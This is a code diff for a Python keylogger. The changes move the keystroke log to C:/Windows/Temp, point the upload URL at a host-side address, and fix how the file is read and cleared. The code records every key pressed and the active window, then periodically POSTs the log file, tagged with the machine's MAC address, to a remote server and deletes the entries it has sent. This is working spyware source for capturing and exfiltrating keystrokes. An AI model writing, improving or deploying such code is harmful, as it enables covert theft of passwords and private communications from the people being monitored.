@@ -5,27 +5,29 @@ import threading # to make log sending repeat in background
 from datetime import datetime, timezone # to classify logs by time sent
 from getmac import get_mac_address # to get mac address
 
-URL = 'http://127.0.0.1:8000/log' # the URL/IP to which you want to send the logs to
+# URL = 'http://127.0.0.1:8000/log' # the URL/IP to which you want to send the logs to
+URL = 'http://10.0.2.2:8000/log'
 INTERVAL = 10.0 # Interval between sending logs (in seconds). Don't make this too low because you're going to DDOS yourself.
 MAC = get_mac_address().replace(':', '') # store mac address
+LOG_LOC = 'C:/Windows/Temp/keylogger-log'
 
-with open('keylogger-log', 'w') as l: # to create the file to avoid any errors
+with open(LOG_LOC, 'w') as l: # to create the file to avoid any errors
     pass
 
 def send_log(): # send log
     try:
-        with open('keylogger-log', 'rb') as log: # open the file in read-only mode binary
-            print(log.read())
+        with open(LOG_LOC, 'rb') as log: # open the file in read-only mode binary
             time = str(datetime.now(timezone.utc))[:-13].replace(':', '.') # get the current utc time, remove milliseconds portion, and switch colons to periods since you cant use colons in file names
             log_name = f'keylogger-log-{time}'
             line_count = len(log.readlines()) # get the number of entries being sent so you know how many to delete from file later
-            print("lines:"+str(line_count))
+            log.seek(0)
             files = {'file' : (log_name, log, 'plain/text')} # make the payload for the file containing the file name, the file in binary, and its MIME type
             r = requests.post(URL, headers={'mac':MAC}, files=files) # POST (send) the file
             if not 300 > r.status_code >= 200:
                 pass # Leaves the entries to go through later if the request didn't go through
             else: # assume new entries were made during process of sending and delete only entries which were already sent
-                with open('keylogger-log', 'r+') as l:
+                with open(LOG_LOC, 'r+') as l:
+                    print('deleting')
                     lines = l.readlines() # get all the entries into an array
                     l.seek(0) # go to start of file
                     l.truncate() # erase the whole file before rewriting
@@ -52,8 +54,9 @@ while True:
         entry = f"Key Pressed: {key} Active Window: {window_name} Time: {time}" # make the entry
         #print(entry) # for debugging purposes
         try:
-            with open("keylogger-log", "a", encoding='utf-8') as log: # open the log file or make a new one if it doesnt exist
+            with open(LOG_LOC, "a", encoding='utf-8') as log: # open the log file or make a new one if it doesnt exist
                 log.write(entry+'\n') # write the entry into the log
+                log.close()
             # Reads the key pressed and active window and writes it into a file.
         except UnicodeEncodeError as e:
             pass
